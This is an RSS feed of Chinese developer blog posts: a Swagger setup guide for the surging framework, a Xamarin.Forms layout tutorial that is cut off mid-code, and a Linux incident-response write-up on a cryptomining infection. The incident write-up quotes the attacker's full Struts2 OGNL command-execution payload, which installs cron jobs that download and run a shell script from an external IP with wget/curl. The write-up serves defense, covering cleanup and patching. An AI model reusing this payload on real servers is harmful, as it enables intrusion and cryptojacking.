<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>surging如何使用swagger 组件测试业务模块 - fanly11</title>
<link>http://www.cnblogs.com/fanliang11/p/9751908.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/fanliang11/p/9751908.html</guid>
<description>&lt;p align=&quot;left&quot;&gt;&lt;span&gt;   微服务架构概念的提出已经有非常长一段时间了，但在近期几年却开始频繁地出现，大家都着手升级成微服务架构，使用着各种技术，大家认为框架有服务治理就是微服务，实现单一协议的服务调用，微服务虽然没有太明确的定义，但是我认为服务应该是一个或者一组相对较小且独立的功能单元，可以自由组合拆分，针对于业务模块的 CRUD 可以注册为服务，而每个服务都是高度自治的，从开发，部署都是独立，而每个服务只做单一功能，利用领域驱动设计去更好的拆分成粒度更小的模块，而框架本身提供了多种协议，如ws,tcp,http,mqtt,rtp,rtcp, 并且有各种功能的中间件，所开发的业务模块，通过框架可以适用于各种业务场景，让开发人员专注于业务开发这才是真正意义上的微服务。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt; 以上只是谈下微服务，避免一些人走向误区。而这篇文章主要介绍下surging如何使用swagger 组件测试业务模块&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://github.com/dotnetcore/surging&quot; target=&quot;_blank&quot;&gt;surging源码下载&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt; &lt;/h2&gt;
&lt;p&gt;surging 集成了Kestrel组件并且扩展swagger组件，以下介绍下如何使用swagger组件&lt;/p&gt;
&lt;h3&gt;xml文档文件设置&lt;/h3&gt;
&lt;p&gt;针对于 swagger 需要生成 schema，那么需要加载接口模块的xml文档文件，可以通过项目-属性-生成-xml文档文件 进行设置，如下图所示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007214301270-1595689058.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过以上设置，如果扫描加载业务模块，可以使用dotnet publish -c release 生成模块文件，如下图所示&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007214706447-436621047.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;文件配置&lt;/h3&gt;
&lt;p&gt;使用swagger ，如果使用官方提供的surging 引擎的话，就需要开启Kestrel组件，如以下配置所示&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
  &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Surging&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Ip&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${Surging_Server_IP}|127.0.0.1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;WatchInterval&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;30&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Port&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${Surging_Server_Port}|98&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MappingIp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${Mapping_ip}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MappingPort&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${Mapping_Port}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Token&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MaxConcurrentRequests&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;20&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ExecutionTimeoutInMilliseconds&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;30000&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Protocol&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${Protocol}|None&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;//&lt;/span&gt;&lt;span&gt;Http、Tcp、None&lt;/span&gt;
    &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;RootPath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${RootPath}|D:\\userapp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Ports&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;HttpPort&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${HttpPort}|280&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;WSPort&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${WSPort}|96&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    },
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;RequestCacheEnabled&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;false&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Packages&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: [
      {
        &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;TypeName&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;EnginePartModule&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Using&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${UseEngineParts}|DotNettyModule;NLogModule;MessagePackModule;ConsulModule;&lt;span&gt;KestrelHttpModule&lt;/span&gt;;WSProtocolModule;EventBusRabbitMQModule;CachingModule;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
      }
    ]
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;以下是配置swagger，如果不添加以下配置，可以禁用swagger&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;43&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
  &quot;Swagger&quot;: {
    &quot;Version&quot;: &quot;${SwaggerVersion}|V1&quot;, // &quot;127.0.0.1:8500&quot;,
    &quot;Title&quot;: &quot;${SwaggerTitle}|Surging Demo&quot;,
    &quot;Description&quot;: &quot;${SwaggerDes}|surging demo&quot;,
    &quot;Contact&quot;: {
      &quot;Name&quot;: &quot;API Support&quot;,
      &quot;Url&quot;: &quot;https://github.com/dotnetcore/surging&quot;,
      &quot;Email&quot;: &quot;fanliang1@hotmail.com&quot;
    },
    &quot;License&quot;: {
      &quot;Name&quot;: &quot;MIT&quot;,
      &quot;Url&quot;: &quot;https://github.com/dotnetcore/surging/blob/master/LICENSE&quot;
    }
  }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt; 通过以上设置，就可以通过http://127.0.0.1:280/swagger进行访问，效果如下图所示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007215922687-132247128.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;测试上传文件&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007220722816-1377269962.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007221652238-1939922189.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;测试下载文件&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007221149685-562368.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007221357140-1034096366.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt; Post 测试&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007222658646-210647417.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007222807631-2112625555.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007222936657-1752933900.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;GET 测试&lt;/h3&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007223048920-1342087317.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007223211775-944800313.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/192878/201810/192878-20181007223256878-1398151253.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;通过swagger 引擎组件能够生成业务接口文档，能够更好的和团队进行协作，而surging计划是去网关中心化，会扩展'关卡(stage)'引擎组件以代替网关，同时也会扩展更多的通信协议，也欢迎大家扩展引擎组件，让生态更强大。&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Sun, 07 Oct 2018 14:43:00 +0000</pubDate>
<dc:creator>fanly11</dc:creator>
<og:description>1、前言 微服务架构概念的提出已经有非常长一段时间了，但在近期几年却开始频繁地出现，大家都着手升级成微服务架构，使用着各种技术，大家认为框架有服务治理就是微服务，实现单一协议的服务调用，微服务虽然没有</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/fanliang11/p/9751908.html</dc:identifier>
</item>
<item>
<title>Linux应急响应（三）：挖矿病毒 - Bypass</title>
<link>http://www.cnblogs.com/xiaozi/p/9751905.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiaozi/p/9751905.html</guid>
<description>&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;​ 随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率，通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞（如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞、Struts2远程命令执行等），导致大量服务器被感染挖矿程序的现象 。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;​ 某天，安全管理员在登录安全设备巡检时，发现某台网站服务器持续向境外IP发起连接，下载病毒源：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007223935754-164004360.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-1.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/p&gt;

&lt;h3 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;A、排查过程&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 :&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007223949643-180882325.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007223955305-1760945919.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span class=&quot;md-image md-img-loaded&quot; data-src=&quot;./image/12-2.png&quot;&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-2.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span class=&quot;md-image md-img-loaded&quot; data-src=&quot;./image/12-3.png&quot;&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-3.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;下载logo.jpg，包含脚本内容如下：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007224006784-353571789.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-4.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;到这里，我们可以发现攻击者下载logo.jpg并执行了里面了shell脚本，那这个脚本是如何启动的呢？&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;通过排查系统开机启动项、定时任务、服务等，在定时任务里面，发现了恶意脚本，每隔一段时间发起请求下载病毒源，并执行 。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007224022478-1847404984.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-5.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;B、溯源分析&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;​ 在Tomcat log日志中，我们找到这样一条记录：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007224036399-468561590.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span class=&quot;md-image md-img-loaded&quot; data-src=&quot;./image/12-6.png&quot;&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-6.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;对日志中攻击源码进行摘录如下：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;code&gt;{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo &quot;*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh&quot; | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&lt;/code&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;可以发现攻击代码中的操作与定时任务中异常脚本一致，据此推断黑客通过Struct 远程命令执行漏洞向服务器定时任务中写入恶意脚本并执行。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;C、清除病毒&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;1、删除定时任务:&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007224104456-1801207334.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span class=&quot;md-image md-img-loaded&quot; data-src=&quot;./image/12-7.png&quot;&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-7.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;span&gt;2、终止异常进程:&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span class=&quot;md-image md-img-loaded&quot; data-src=&quot;./image/12-7.png&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/894761/201810/894761-20181007224113387-164272923.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span class=&quot;md-image md-img-loaded&quot; data-src=&quot;./image/12-8.png&quot;&gt;&lt;img src=&quot;file://e/MyTool/总结与思考/原创文章/应急响应实战笔记/image/12-8.png?lastModify=1538923148&quot; alt=&quot;&quot; data-local-refresh=&quot;true&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;D、漏洞修复&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;​ 升级struts到最新版本&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;​ 针对服务器被感染挖矿程序的现象，总结了几种预防措施：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;md-fences md-end-block&quot;&gt;
&lt;span&gt;1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护&lt;br/&gt;&lt;span&gt;2、及时更新 Windows安全补丁，开启防火墙临时关闭端口&lt;br/&gt;&lt;span&gt;3、及时更新web漏洞补丁，升级web组件&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;

&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;关于我：一个网络安全爱好者，致力于分享原创高质量干货，欢迎关注我的个人微信公众号：Bypass--，浏览更多精彩文章。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/894761/201806/894761-20180604111856354-1328510502.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 07 Oct 2018 14:42:00 +0000</pubDate>
<dc:creator>Bypass</dc:creator>
<og:description>0x00 前言 ​ 随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xiaozi/p/9751905.html</dc:identifier>
</item>
<item>
<title>xamarin forms常用的布局stacklayout详解 - 张林-布莱恩特</title>
<link>http://www.cnblogs.com/zhangmumu/p/9751788.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhangmumu/p/9751788.html</guid>
<description>&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;通过这篇文章你将了解到xamarin forms中最简单常用的布局StackLayout。至于其他几种布局使用起来，效果相对较差，目前在项目中使用最多的也就是这两种布局StackLayout和Grid。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;之前上一家的的同事在写xamarin android的时候，聊天给我说他写axml布局的时候都是拖控件，这有点刷新我认知的下线，一直拖控件“历史原因”，造成的坏处是显而易见的，无法熟练掌握布局的常用属性，至于xamarin forms能不能拖控件，就目前来说是不能的，布局的设计有两种实现方式，一种是以c#代码的方式，一种是以xaml布局的方式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如下图是xamarin forms中最见的五种布局，本篇文章将使用最常用的一种布局StackLayout，实现一个简易计算器的布局，便于熟悉和掌握这种布局的各种属性。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://docs.microsoft.com/zh-cn/xamarin/xamarin-forms/user-interface/layouts/images/layouts-sml.png&quot; alt=&quot;xamarin forms常用的布局stacklayout、grid详解&quot;/&gt;&lt;/p&gt;
&lt;p&gt;StackLayout相似于android中LinearLayout、前端css中的默认的Static定位；Grid相似于android中GridLayout，html中的Table布局。&lt;/p&gt;
&lt;h4 id=&quot;stacklayout布局属性和属性值的作用&quot;&gt;1.StackLayout布局属性和属性值的作用&lt;/h4&gt;
&lt;p&gt;顾名思义，StackLayout是一种可以在上下方向、左右方向堆叠的布局，简单而又常用的布局，我们需要掌握它的三个重要属性，最重要的是布局方向和布局定位。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Orientation :布局方向，枚举类型，表示StackLayout以哪种方向的布局， Vertical (垂直方向布局) 和&lt;br/&gt;Horizontal（水平方向布局）,默认值是Vertical.&lt;/li&gt;
&lt;li&gt;Spacing :double类型，表示每个子视图之间的间隙, 默认值 6.0.&lt;/li&gt;
&lt;li&gt;VerticalOptions和HorizontalOptions：布局定位（既可以定位又可以设置布局元素大小），该属性的属性值有8个分别是
&lt;ol&gt;&lt;li&gt;Start：在父布局开始位置&lt;/li&gt;
&lt;li&gt;Center：在父布局中间位置&lt;/li&gt;
&lt;li&gt;End：在父布局最后位置&lt;/li&gt;
&lt;li&gt;Fill：填充整个父布局的位置&lt;/li&gt;
&lt;li&gt;StartAndExpand、CenterAndExpand、EndAndExpand、FillAndExpand，这种带AndExpand的作用就是：根据其他布局的内容大小，如果有空白位置就会自动填充。当多个属性值都是AndExpand则会平分空白部分。&lt;br/&gt;直接来个布局看看这些个属性到底是怎么用的吧&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1220420/201810/1220420-20181007221623622-1066928199.png&quot;/&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&amp;gt;
&amp;lt;ContentPage xmlns=&quot;http://xamarin.com/schemas/2014/forms&quot;
             xmlns:x=&quot;http://schemas.microsoft.com/winfx/2009/xaml&quot;
             xmlns:local=&quot;clr-namespace:XamarinFormsLayout&quot;
             x:Class=&quot;XamarinFormsLayout.MainPage&quot;&amp;gt;
    &amp;lt;StackLayout Orientation=&quot;Vertical&quot;&amp;gt;
        &amp;lt;StackLayout Orientation=&quot;Vertical&quot; BackgroundColor=&quot;Accent&quot; VerticalOptions=&quot;FillAndExpand&quot; Padding=&quot;10&quot;&amp;gt;
            &amp;lt;Label Text=&quot;我在左边&quot; 
           HeightRequest=&quot;100&quot;
           WidthRequest=&quot;200&quot;
           HorizontalOptions=&quot;Start&quot;
           VerticalOptions=&quot;Start&quot;
           BackgroundColor=&quot;AliceBlue&quot;
           TextColor=&quot;Black&quot;
           VerticalTextAlignment=&quot;Center&quot;/&amp;gt;
            &amp;lt;Label Text=&quot;我在右边&quot; 
           HorizontalOptions=&quot;End&quot;
           VerticalOptions=&quot;End&quot;
           BackgroundColor=&quot;AliceBlue&quot;
           TextColor=&quot;Black&quot;
           VerticalTextAlignment=&quot;Center&quot;/&amp;gt;
        &amp;lt;/StackLayout&amp;gt;
        &amp;lt;StackLayout Orientation=&quot;Horizontal&quot; BackgroundColor=&quot;Aquamarine&quot; VerticalOptions=&quot;Start&quot; HeightRequest=&quot;50&quot;&amp;gt;
            &amp;lt;Label HorizontalOptions=&quot;Start&quot; VerticalOptions=&quot;CenterAndExpand&quot;  Text=&quot;我在左边&quot; TextColor=&quot;Black&quot; BackgroundColor=&quot;Azure&quot;&amp;gt;&amp;lt;/Label&amp;gt;
